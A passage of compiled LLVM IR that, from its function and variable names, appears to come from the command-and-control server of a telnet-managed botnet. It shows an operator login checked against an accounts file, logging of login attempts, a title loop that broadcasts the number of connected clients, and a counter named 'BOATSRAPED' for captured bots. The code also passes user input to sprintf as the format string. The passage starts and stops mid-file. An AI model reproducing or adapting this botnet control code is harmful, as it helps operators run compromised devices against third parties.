declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define void @client_addr(i64, i64) #0 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = bitcast %struct.sockaddr_in* %3 to { i64, i64 }*
  %5 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %4, i32 0, i32 0
  store i64 %0, i64* %5, align 4
  %6 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %4, i32 0, i32 1
  store i64 %1, i64* %6, align 4
  %7 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %7, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = and i32 %9, 255
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %12 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %11, i32 0, i32 0
  %13 = load i32, i32* %12, align 4
  %14 = and i32 %13, 65280
  %15 = lshr i32 %14, 8
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  %18 = load i32, i32* %17, align 4
  %19 = and i32 %18, 16711680
  %20 = lshr i32 %19, 16
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  %23 = load i32, i32* %22, align 4
  %24 = and i32 %23, -16777216
  %25 = lshr i32 %24, 24
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.17, i32 0, i32 0), i32 %10, i32 %15, i32 %20, i32 %25)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @hostname_to_ip(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.in_addr**, align 8
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %6, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.18, i32 0, i32 0)) #7
  store i32 1, i32* %3, align 4
  br label %40

; <label>:13:                                     ; preds = %2
  %14 = load %struct.hostent*, %struct.hostent** %6, align 8
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %14, i32 0, i32 4
  %16 = load i8**, i8*** %15, align 8
  %17 = bitcast i8** %16 to %struct.in_addr**
  store %struct.in_addr** %17, %struct.in_addr*** %7, align 8
  store i32 0, i32* %8, align 4
  br label %18

; <label>:18:                                     ; preds = %36, %13
  %19 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %19, i64 %21
  %23 = load %struct.in_addr*, %struct.in_addr** %22, align 8
  %24 = icmp ne %struct.in_addr* %23, null
  br i1 %24, label %25, label %39

; <label>:25:                                     ; preds = %18
  %26 = load i8*, i8** %5, align 8
  %27 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %28 = load i32, i32* %8, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %27, i64 %29
  %31 = load %struct.in_addr*, %struct.in_addr** %30, align 8
  %32 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %31, i32 0, i32 0
  %33 = load i32, i32* %32, align 4
  %34 = call i8* @inet_ntoa(i32 %33) #7
  %35 = call i8* @strcpy(i8* %26, i8* %34) #7
  store i32 0, i32* %3, align 4
  br label %40
                                                  ; No predecessors!
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  br label %18

; <label>:39:                                     ; preds = %18
  store i32 1, i32* %3, align 4
  br label %40

; <label>:40:                                     ; preds = %39, %25, %12
  %41 = load i32, i32* %3, align 4
  ret i32 %41
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @herror(i8*) #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @titleWriter(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca [4 x i8*], align 16
  %7 = alloca i32, align 4
  %8 = alloca [1000 x i8], align 16
  store i8* %0, i8** %3, align 8
  %9 = load i8*, i8** %3, align 8
  %10 = ptrtoint i8* %9 to i64
  %11 = trunc i64 %10 to i32
  store i32 %11, i32* %4, align 4
  %12 = bitcast [4 x i8*]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* bitcast ([4 x i8*]* @titleWriter.spinbuf to i8*), i64 32, i32 16, i1 false)
  %13 = bitcast [1000 x i8]* %8 to i8*
  call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 1000, i32 16, i1 false)
  br label %14

; <label>:14:                                     ; preds = %41, %1
  store i32 0, i32* %7, align 4
  br label %15

; <label>:15:                                     ; preds = %38, %14
  %16 = load i32, i32* %7, align 4
  %17 = sext i32 %16 to i64
  %18 = icmp ult i64 %17, 4
  br i1 %18, label %19, label %41

; <label>:19:                                     ; preds = %15
  %20 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 2048, i32 16, i1 false)
  %21 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %22 = call i32 @clientsConnected()
  %23 = load i32, i32* %7, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [4 x i8*], [4 x i8*]* %6, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = getelementptr inbounds [1000 x i8], [1000 x i8]* %8, i32 0, i32 0
  %28 = call i32 (i8*, i8*, ...) @sprintf(i8* %21, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.23, i32 0, i32 0), i32 27, i32 %22, i8* %26, i8* %27, i32 7) #7
  %29 = load i32, i32* %4, align 4
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %31 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %32 = call i64 @strlen(i8* %31) #8
  %33 = call i64 @send(i32 %29, i8* %30, i64 %32, i32 16384)
  %34 = icmp eq i64 %33, -1
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %19
  br label %36

; <label>:36:                                     ; preds = %35, %19
  %37 = call i32 @sleep(i32 1)
  br label %38

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %7, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %7, align 4
  br label %15

; <label>:41:                                     ; preds = %15
  br label %14
                                                  ; No predecessors!
  %43 = load i8*, i8** %2, align 8
  ret i8* %43
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetWorker(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca [2048 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca [80 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [2048 x i8], align 16
  %18 = alloca %struct._IO_FILE*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca %struct._IO_FILE*, align 8
  %23 = alloca %struct._IO_FILE*, align 8
  %24 = alloca [80 x i8], align 16
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca [512 x i8], align 16
  %28 = alloca [512 x i8], align 16
  %29 = alloca [100 x i8*], align 16
  %30 = alloca i8*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %struct._IO_FILE*, align 8
  %33 = alloca %struct._IO_FILE*, align 8
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca [20 x i8], align 16
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca [50 x i8*], align 16
  %43 = alloca %struct._IO_FILE*, align 8
  %44 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %45 = load i8*, i8** %3, align 8
  %46 = ptrtoint i8* %45 to i64
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %4, align 4
  %48 = load volatile i32, i32* @managesConnected, align 4
  %49 = add nsw i32 %48, 1
  store volatile i32 %49, i32* @managesConnected, align 4
  %50 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 2048, i32 16, i1 false)
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i32 0, i32 0), i8** %12, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i32 0, i32 0), i8** %13, align 8
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i32 0, i32 0), i8** %14, align 8
  store i32 0, i32* %16, align 4
  %51 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %51, i8 0, i64 2048, i32 16, i1 false)
  %52 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %52, i8 0, i64 2048, i32 16, i1 false)
  store i32 0, i32* %19, align 4
  %53 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0))
  store %struct._IO_FILE* %53, %struct._IO_FILE** %18, align 8
  br label %54

; <label>:54:                                     ; preds = %59, %1
  %55 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %56 = call i32 @feof(%struct._IO_FILE* %55) #7
  %57 = icmp ne i32 %56, 0
  %58 = xor i1 %57, true
  br i1 %58, label %59, label %64

; <label>:59:                                     ; preds = %54
  %60 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %61 = call i32 @fgetc(%struct._IO_FILE* %60)
  store i32 %61, i32* %20, align 4
  %62 = load i32, i32* %19, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %19, align 4
  br label %54

; <label>:64:                                     ; preds = %54
  store i32 0, i32* %21, align 4
  %65 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  call void @rewind(%struct._IO_FILE* %65)
  br label %66

; <label>:66:                                     ; preds = %71, %64
  %67 = load i32, i32* %21, align 4
  %68 = load i32, i32* %19, align 4
  %69 = sub nsw i32 %68, 1
  %70 = icmp ne i32 %67, %69
  br i1 %70, label %71, label %91

; <label>:71:                                     ; preds = %66
  %72 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %73 = load i32, i32* %21, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %74
  %76 = getelementptr inbounds %struct.account, %struct.account* %75, i32 0, i32 0
  %77 = getelementptr inbounds [200 x i8], [200 x i8]* %76, i32 0, i32 0
  %78 = load i32, i32* %21, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %79
  %81 = getelementptr inbounds %struct.account, %struct.account* %80, i32 0, i32 1
  %82 = getelementptr inbounds [200 x i8], [200 x i8]* %81, i32 0, i32 0
  %83 = load i32, i32* %21, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %84
  %86 = getelementptr inbounds %struct.account, %struct.account* %85, i32 0, i32 2
  %87 = getelementptr inbounds [200 x i8], [200 x i8]* %86, i32 0, i32 0
  %88 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %72, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0), i8* %77, i8* %82, i8* %87)
  %89 = load i32, i32* %21, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %21, align 4
  br label %66

; <label>:91:                                     ; preds = %66
  %92 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %93 = load i32, i32* %4, align 4
  %94 = call i32 @fdgets(i8* %92, i32 2048, i32 %93)
  %95 = icmp slt i32 %94, 1
  br i1 %95, label %96, label %97

; <label>:96:                                     ; preds = %91
  br label %960

; <label>:97:                                     ; preds = %91
  %98 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %99 = load i8*, i8** %14, align 8
  %100 = call i8* @strstr(i8* %98, i8* %99) #8
  %101 = icmp ne i8* %100, null
  br i1 %101, label %102, label %103

; <label>:102:                                    ; preds = %97
  br label %104

; <label>:103:                                    ; preds = %97
  br label %960

; <label>:104:                                    ; preds = %102
  %105 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %106 = call i32 (i8*, i8*, ...) @sprintf(i8* %105, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.28, i32 0, i32 0)) #7
  %107 = load i32, i32* %4, align 4
  %108 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %109 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %110 = call i64 @strlen(i8* %109) #8
  %111 = call i64 @send(i32 %107, i8* %108, i64 %110, i32 16384)
  %112 = icmp eq i64 %111, -1
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %104
  br label %960

; <label>:114:                                    ; preds = %104
  %115 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %116 = load i32, i32* %4, align 4
  %117 = call i32 @fdgets(i8* %115, i32 2048, i32 %116)
  %118 = icmp slt i32 %117, 1
  br i1 %118, label %119, label %120

; <label>:119:                                    ; preds = %114
  br label %960

; <label>:120:                                    ; preds = %114
  %121 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %121)
  %122 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  %123 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %124 = call i32 (i8*, i8*, ...) @sprintf(i8* %122, i8* %123) #7
  %125 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  store i8* %125, i8** %9, align 8
  %126 = load i8*, i8** %9, align 8
  %127 = call i32 @Search_in_File(i8* %126)
  store i32 %127, i32* %5, align 4
  %128 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %128, %struct._IO_FILE** %22, align 8
  %129 = load %struct._IO_FILE*, %struct._IO_FILE** %22, align 8
  %130 = load i8*, i8** %9, align 8
  %131 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %129, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i32 0, i32 0), i8* %130)
  %132 = load %struct._IO_FILE*, %struct._IO_FILE** %22, align 8
  %133 = call i32 @fclose(%struct._IO_FILE* %132)
  %134 = load i8*, i8** %9, align 8
  %135 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i32 0, i32 0), i8* %134)
  %136 = load i8*, i8** %9, align 8
  %137 = load i32, i32* %5, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %138
  %140 = getelementptr inbounds %struct.account, %struct.account* %139, i32 0, i32 0
  %141 = getelementptr inbounds [200 x i8], [200 x i8]* %140, i32 0, i32 0
  %142 = call i32 @strcmp(i8* %136, i8* %141) #8
  %143 = icmp eq i32 %142, 0
  br i1 %143, label %144, label %173

; <label>:144:                                    ; preds = %120
  %145 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %146 = call i32 (i8*, i8*, ...) @sprintf(i8* %145, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.33, i32 0, i32 0)) #7
  %147 = load i32, i32* %4, align 4
  %148 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %149 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %150 = call i64 @strlen(i8* %149) #8
  %151 = call i64 @send(i32 %147, i8* %148, i64 %150, i32 16384)
  %152 = icmp eq i64 %151, -1
  br i1 %152, label %153, label %154

; <label>:153:                                    ; preds = %144
  br label %960

; <label>:154:                                    ; preds = %144
  %155 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %156 = load i32, i32* %4, align 4
  %157 = call i32 @fdgets(i8* %155, i32 2048, i32 %156)
  %158 = icmp slt i32 %157, 1
  br i1 %158, label %159, label %160

; <label>:159:                                    ; preds = %154
  br label %960

; <label>:160:                                    ; preds = %154
  %161 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %161)
  %162 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %164
  %166 = getelementptr inbounds %struct.account, %struct.account* %165, i32 0, i32 1
  %167 = getelementptr inbounds [200 x i8], [200 x i8]* %166, i32 0, i32 0
  %168 = call i32 @strcmp(i8* %162, i8* %167) #8
  %169 = icmp ne i32 %168, 0
  br i1 %169, label %170, label %171

; <label>:170:                                    ; preds = %160
  br label %174

; <label>:171:                                    ; preds = %160
  %172 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %172, i8 0, i64 2048, i32 16, i1 false)
  br label %186

; <label>:173:                                    ; preds = %120
  br label %174

; <label>:174:                                    ; preds = %173, %170
  %175 = load i32, i32* %4, align 4
  %176 = call i64 @send(i32 %175, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i64 5, i32 16384)
  %177 = icmp eq i64 %176, -1
  br i1 %177, label %178, label %179

; <label>:178:                                    ; preds = %174
  br label %960

; <label>:179:                                    ; preds = %174
  %180 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %180, %struct._IO_FILE** %23, align 8
  %181 = load %struct._IO_FILE*, %struct._IO_FILE** %23, align 8
  %182 = load i8*, i8** %9, align 8
  %183 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %181, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i32 0, i32 0), i8* %182)
  %184 = load %struct._IO_FILE*, %struct._IO_FILE** %23, align 8
  %185 = call i32 @fclose(%struct._IO_FILE* %184)
  br label %960

; <label>:186:                                    ; preds = %171
  %187 = load i32, i32* %4, align 4
  %188 = call i64 @send(i32 %187, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i32 0, i32 0), i64 14, i32 16384)
  %189 = icmp eq i64 %188, -1
  br i1 %189, label %190, label %191

; <label>:190:                                    ; preds = %186
  br label %960

; <label>:191:                                    ; preds = %186
  %192 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %193 = load i32, i32* %5, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %194
  %196 = getelementptr inbounds %struct.account, %struct.account* %195, i32 0, i32 0
  %197 = getelementptr inbounds [200 x i8], [200 x i8]* %196, i32 0, i32 0
  %198 = call i32 (i8*, i8*, ...) @sprintf(i8* %192, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.37, i32 0, i32 0), i8* %197) #7
  %199 = load i32, i32* %4, align 4
  %200 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %201 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %202 = call i64 @strlen(i8* %201) #8
  %203 = call i64 @send(i32 %199, i8* %200, i64 %202, i32 16384)
  %204 = icmp eq i64 %203, -1
  br i1 %204, label %205, label %206

; <label>:205:                                    ; preds = %191
  br label %960

; <label>:206:                                    ; preds = %191
  %207 = load i8*, i8** %3, align 8
  %208 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %207) #7
  %209 = load i32, i32* %4, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %210
  %212 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %211, i32 0, i32 2
  %213 = getelementptr inbounds [20 x i8], [20 x i8]* %212, i32 0, i32 0
  %214 = load i32, i32* %5, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %215
  %217 = getelementptr inbounds %struct.account, %struct.account* %216, i32 0, i32 0
  %218 = getelementptr inbounds [200 x i8], [200 x i8]* %217, i32 0, i32 0
  %219 = call i32 (i8*, i8*, ...) @sprintf(i8* %213, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.29, i32 0, i32 0), i8* %218) #7
  %220 = load i32, i32* %4, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %221
  %223 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %222, i32 0, i32 1
  store i32 1, i32* %223, align 4
  br label %224

; <label>:224:                                    ; preds = %936, %935, %206
  %225 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %226 = load i32, i32* %4, align 4
  %227 = call i32 @fdgets(i8* %225, i32 2048, i32 %226)
  %228 = icmp sgt i32 %227, 0
  br i1 %228, label %229, label %959

; <label>:229:                                    ; preds = %224
  %230 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %231 = call i8* @strstr(i8* %230, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i32 0, i32 0)) #8
  %232 = icmp ne i8* %231, null
  br i1 %232, label %241, label %233

; <label>:233:                                    ; preds = %229
  %234 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %235 = call i8* @strstr(i8* %234, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.39, i32 0, i32 0)) #8
  %236 = icmp ne i8* %235, null
  br i1 %236, label %241, label %237

; <label>:237:                                    ; preds = %233
  %238 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %239 = call i8* @strstr(i8* %238, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.40, i32 0, i32 0)) #8
  %240 = icmp ne i8* %239, null
  br i1 %240, label %241, label %305

; <label>:241:                                    ; preds = %237, %233, %229
  %242 = call i32 @joinn()
  store i32 1, i32* %26, align 4
  store i32 0, i32* %25, align 4
  br label %243

; <label>:243:                                    ; preds = %290, %241
  %244 = load i32, i32* %25, align 4
  %245 = icmp slt i32 %244, 40
  br i1 %245, label %246, label %293

; <label>:246:                                    ; preds = %243
  %247 = load i32, i32* %25, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %248
  %250 = getelementptr inbounds %struct.name, %struct.name* %249, i32 0, i32 1
  %251 = load i32, i32* %250, align 4
  %252 = icmp sle i32 %251, 0
  br i1 %252, label %253, label %259

; <label>:253:                                    ; preds = %246
  %254 = load i32, i32* %25, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %255
  %257 = getelementptr inbounds %struct.name, %struct.name* %256, i32 0, i32 0
  %258 = getelementptr inbounds [512 x i8], [512 x i8]* %257, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %258, i8 0, i64 512, i32 4, i1 false)
  br label %259

; <label>:259:                                    ; preds = %253, %246
  %260 = load i32, i32* %25, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %261
  %263 = getelementptr inbounds %struct.name, %struct.name* %262, i32 0, i32 0
  %264 = getelementptr inbounds [512 x i8], [512 x i8]* %263, i32 0, i32 0
  %265 = call i64 @strlen(i8* %264) #8
  %266 = icmp uge i64 %265, 1
  br i1 %266, label %267, label %289

; <label>:267:                                    ; preds = %259
  %268 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  %269 = load i32, i32* %25, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %270
  %272 = getelementptr inbounds %struct.name, %struct.name* %271, i32 0, i32 0
  %273 = getelementptr inbounds [512 x i8], [512 x i8]* %272, i32 0, i32 0
  %274 = load i32, i32* %25, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %275
  %277 = getelementptr inbounds %struct.name, %struct.name* %276, i32 0, i32 1
  %278 = load i32, i32* %277, align 4
  %279 = call i32 (i8*, i8*, ...) @sprintf(i8* %268, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.41, i32 0, i32 0), i8* %273, i32 %278) #7
  %280 = load i32, i32* %4, align 4
  %281 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  %282 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  %283 = call i64 @strlen(i8* %282) #8
  %284 = call i64 @send(i32 %280, i8* %281, i64 %283, i32 16384)
  %285 = icmp eq i64 %284, -1
  br i1 %285, label %286, label %287

; <label>:286:                                    ; preds = %267
  br label %960

; <label>:287:                                    ; preds = %267
  %288 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %288, i8 0, i64 512, i32 16, i1 false)
  br label %289

; <label>:289:                                    ; preds = %287, %259
  br label %290

; <label>:290:                                    ; preds = %289
  %291 = load i32, i32* %25, align 4
  %292 = add nsw i32 %291, 1
  store i32 %292, i32* %25, align 4
  br label %243

; <label>:293:                                    ; preds = %243
  %294 = getelementptr inbounds [512 x i8], [512 x i8]* %28, i32 0, i32 0
  %295 = call i32 @clientsConnected()
  %296 = call i32 (i8*, i8*, ...) @sprintf(i8* %294, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.42, i32 0, i32 0), i32 %295) #7
  %297 = load i32, i32* %4, align 4
  %298 = getelementptr inbounds [512 x i8], [512 x i8]* %28, i32 0, i32 0
  %299 = getelementptr inbounds [512 x i8], [512 x i8]* %28, i32 0, i32 0
  %300 = call i64 @strlen(i8* %299) #8
  %301 = call i64 @send(i32 %297, i8* %298, i64 %300, i32 16384)
  %302 = icmp eq i64 %301, -1
  br i1 %302, label %303, label %304

; <label>:303:                                    ; preds = %293
  br label %960

; <label>:304:                                    ; preds = %293
  br label %305

; <label>:305:                                    ; preds = %304, %237
  %306 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %307 = call i8* @strstr(i8* %306, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.43, i32 0, i32 0)) #8
  %308 = icmp ne i8* %307, null
  br i1 %308, label %309, label %321

; <label>:309:                                    ; preds = %305
  %310 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %311 = load volatile i32, i32* @BOATSRAPED, align 4
  %312 = call i32 (i8*, i8*, ...) @sprintf(i8* %310, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.44, i32 0, i32 0), i32 %311) #7
  %313 = load i32, i32* %4, align 4
  %314 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %315 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %316 = call i64 @strlen(i8* %315) #8
  %317 = call i64 @send(i32 %313, i8* %314, i64 %316, i32 16384)
  %318 = icmp eq i64 %317, -1
